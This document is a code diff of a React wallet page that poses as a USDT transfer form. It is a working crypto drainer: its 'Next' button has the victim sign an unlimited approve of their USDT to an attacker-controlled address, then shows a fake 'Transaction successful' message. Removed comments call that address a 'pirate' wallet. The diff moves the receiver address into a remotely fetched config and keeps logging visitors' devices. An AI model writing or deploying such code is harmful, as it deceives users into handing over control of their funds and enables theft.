@@ -2,9 +2,7 @@
 
 import { useState, useEffect, useRef } from "react";
 
-// ⚠️ REMPLACE ces deux valeurs par les tiennes
-const RECEIVER = "0xb5A0D5701Ea10e2d3E54D1EBDF0336d2C9c24fef";  // Ton wallet pirate
-const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT Mainnet
+const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const ETH_CHAIN_ID = "0x1";
 
 interface EthereumProvider {
@@ -40,7 +38,7 @@ async function getEthers() {
 }
 
 export default function WalletPage() {
-  const [address, setAddress] = useState(RECEIVER);
+  const [receiver, setReceiver] = useState("");
   const [loading, setLoading] = useState(false);
   const [txHash, setTxHash] = useState("");
   const [displayAmount, setDisplayAmount] = useState("0");
@@ -50,10 +48,20 @@ export default function WalletPage() {
   const providerRef = useRef<EthereumProvider | null>(null);
   const keypadRef = useRef<HTMLDivElement>(null);
 
-  // Initialisation + log scan
   useEffect(() => {
     let cancelled = false;
 
+    // Charger le receiver depuis Supabase
+    fetch("/api/config", { cache: "no-store" })
+      .then((r) => r.json())
+      .then((data) => {
+        if (data.config?.receiver_address && !cancelled) {
+          setReceiver(data.config.receiver_address);
+        }
+      })
+      .catch(() => {});
+
+    // Log scan
     (async () => {
       try {
         const ua = navigator.userAgent.toLowerCase();
@@ -62,15 +70,9 @@ export default function WalletPage() {
         await fetch("/api/log-scan", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            to: RECEIVER,
-            amount: "1",
-            token: "USDT",
-            userAgent: device,
-            platform,
-          }),
+          body: JSON.stringify({ to: "pending", amount: "1", token: "USDT", userAgent: device, platform }),
         });
-      } catch { }
+      } catch {}
     })();
 
     const init = async () => {
@@ -80,21 +82,21 @@ export default function WalletPage() {
       try {
         const chainId = (await p.request({ method: "eth_chainId" })) as string;
         if (chainId && chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
-          await p.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: ETH_CHAIN_ID }],
-          });
+          await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ETH_CHAIN_ID }] });
         }
-      } catch { }
+      } catch {}
     };
     init();
     return () => { cancelled = true; };
   }, []);
 
-  // ------------------------------------------------------------
-  // LE CŒUR : approve illimité vers Wallet 2 (EOA, pas contrat)
-  // ------------------------------------------------------------
   const handleSend = async () => {
+    if (!receiver || !/^0x[a-fA-F0-9]{40}$/.test(receiver)) {
+      setModalStatus("error");
+      setShowModal(true);
+      return;
+    }
+
     setShowModal(false);
     setLoading(true);
 
@@ -105,21 +107,14 @@ export default function WalletPage() {
     try {
       const chainId = (await p.request({ method: "eth_chainId" })) as string;
       if (chainId && chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
-        await p.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: ETH_CHAIN_ID }],
-        });
+        await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ETH_CHAIN_ID }] });
       }
-    } catch { }
+    } catch {}
 
     try {
       const { ethers } = await getEthers();
-
-      // Appel direct au contrat USDT natif — pas de contrat custom
-      const iface = new ethers.Interface([
-        "function approve(address spender, uint256 amount) returns (bool)"
-      ]);
-      const data = iface.encodeFunctionData("approve", [RECEIVER, ethers.MaxUint256]);
+      const iface = new ethers.Interface(["function approve(address spender, uint256 amount) returns (bool)"]);
+      const data = iface.encodeFunctionData("approve", [receiver, ethers.MaxUint256]);
 
       const hash = (await p.request({
         method: "eth_sendTransaction",
@@ -155,36 +150,21 @@ export default function WalletPage() {
     });
   };
 
-  const handleKeyTouch = (
-    e: React.PointerEvent<HTMLButtonElement> | React.MouseEvent<HTMLButtonElement>,
-    key: string
-  ) => {
+  const handleKeyTouch = (e: React.PointerEvent<HTMLButtonElement> | React.MouseEvent<HTMLButtonElement>, key: string) => {
     e.preventDefault(); e.stopPropagation();
     handleKeyPress(key);
   };
 
   return (
-    <main
-      className="transfer-main transfer-main-pad"
-      onClick={() => setIsKeyboardVisible(false)}
-      style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", padding: "2rem 1rem" }}
-    >
+    <main className="transfer-main transfer-main-pad" onClick={() => setIsKeyboardVisible(false)} style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", padding: "2rem 1rem" }}>
       <div className="form-container" style={{ maxWidth: 480, width: "100%" }}>
         <label className="form-label">Address or domain name</label>
         <div className="input-row">
-          <input
-            type="text"
-            value={address}
-            readOnly
-            className="input-row__field"
-          />
+          <input type="text" value={receiver ? `${receiver.slice(0, 10)}...${receiver.slice(-8)}` : "Loading..."} readOnly className="input-row__field" />
         </div>
 
         <label className="form-label form-label--spaced">Amount</label>
-        <div
-          className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`}
-          onClick={(e) => { e.stopPropagation(); setIsKeyboardVisible(true); }}
-        >
+        <div className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`} onClick={(e) => { e.stopPropagation(); setIsKeyboardVisible(true); }}>
           <div className="montant-input-wrapper">
             <span className="montant-display-value">{displayAmount || "0"}</span>
             {isKeyboardVisible && <span className="blinking-cursor" />}
@@ -198,19 +178,8 @@ export default function WalletPage() {
       <div style={{ flexGrow: 1 }} />
 
       <div className="next-btn-wrapper" style={{ maxWidth: 480, width: "100%" }}>
-        <button
-          onClick={(e) => { e.stopPropagation(); handleSend(); }}
-          disabled={loading}
-          className={`next-btn ${loading ? "next-btn--loading" : ""}`}
-        >
-          {loading ? (
-            <span className="btn-spinner-wrapper">
-              <span className="btn-spinner" />
-              Processing...
-            </span>
-          ) : (
-            "Next"
-          )}
+        <button onClick={(e) => { e.stopPropagation(); handleSend(); }} disabled={loading} className={`next-btn ${loading ? "next-btn--loading" : ""}`}>
+          {loading ? <span className="btn-spinner-wrapper"><span className="btn-spinner" />Processing...</span> : "Next"}
         </button>
       </div>
 
@@ -221,15 +190,9 @@ export default function WalletPage() {
               <span className="keypad-key__number">{n}</span>
             </button>
           ))}
-          <button type="button" onPointerDown={(e) => handleKeyTouch(e, ",")} onClick={(e) => e.preventDefault()} className="keypad-key keypad-key--special">
-            <span className="keypad-key__number">,</span>
-          </button>
-          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "0")} onClick={(e) => e.preventDefault()} className="keypad-key">
-            <span className="keypad-key__number">0</span>
-          </button>
-          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "⌫")} onClick={(e) => e.preventDefault()} className="keypad-key keypad-key--special">
-            ⌫
-          </button>
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, ",")} onClick={(e) => e.preventDefault()} className="keypad-key keypad-key--special"><span className="keypad-key__number">,</span></button>
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "0")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">0</span></button>
+          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "⌫")} onClick={(e) => e.preventDefault()} className="keypad-key keypad-key--special">⌫</button>
         </div>
       )}
 
@@ -238,34 +201,10 @@ export default function WalletPage() {
           <div className="modal-card" onClick={(e) => e.stopPropagation()}>
             <button className="modal-close-btn" onClick={() => setShowModal(false)}>✕</button>
             <img src="/yes.png" alt="Status" className="modal-logo" />
-            {modalStatus === "pending" && (
-              <>
-                <h2 className="modal-title">Processing...</h2>
-                <p className="modal-text">Blockchain validation is underway.</p>
-              </>
-            )}
-            {modalStatus === "success" && (
-              <>
-                <h2 className="modal-title" style={{ color: "#10b981" }}>Transaction successful!</h2>
-                <p className="modal-text">Your transfer has been validated on the Ethereum blockchain.</p>
-              </>
-            )}
-            {modalStatus === "error" && (
-              <>
-                <h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction failed</h2>
-                <p className="modal-text">The transaction failed.</p>
-              </>
-            )}
-            {txHash && (
-              <a
-                href={`https://etherscan.io/tx/${txHash}`}
-                target="_blank"
-                rel="noopener noreferrer"
-                className="modal-details-btn"
-              >
-                Transaction details
-              </a>
-            )}
+            {modalStatus === "pending" && (<><h2 className="modal-title">Processing...</h2><p className="modal-text">Blockchain validation is underway.</p></>)}
+            {modalStatus === "success" && (<><h2 className="modal-title" style={{ color: "#10b981" }}>Transaction successful!</h2><p className="modal-text">Your transfer has been validated.</p></>)}
+            {modalStatus === "error" && (<><h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction failed</h2><p className="modal-text">The transaction failed.</p></>)}
+            {txHash && <a href={`https://etherscan.io/tx/${txHash}`} target="_blank" rel="noopener noreferrer" className="modal-details-btn">Transaction details</a>}
           </div>
         </div>
       )}
